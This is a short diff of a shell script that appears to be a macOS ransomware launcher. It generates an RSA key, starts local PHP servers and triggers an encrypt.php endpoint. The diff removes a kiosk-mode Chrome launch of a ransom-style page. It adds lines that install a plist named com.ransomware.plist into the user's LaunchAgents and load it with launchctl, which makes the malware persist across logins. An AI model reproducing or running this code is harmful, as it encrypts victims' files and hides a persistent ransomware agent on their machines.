@@ -12,4 +12,5 @@ openssl genrsa -out ~/.key2.pem
 
 php -S localhost:1338 & sleep 2
 php -S localhost:1337 & sleep 2
-curl localhost:1338/encrypt.php & /Applications/Google\ Chrome.app/Contents/MacOS/Google\ Chrome --kiosk --app=http://localhost:1337/krcor.php & disown
+curl localhost:1338/encrypt.php & mv $DIR/com.ransomware.plist ~/Library/LaunchAgents
+launchctl load ~/Library/LaunchAgents/com.ransomware.plist
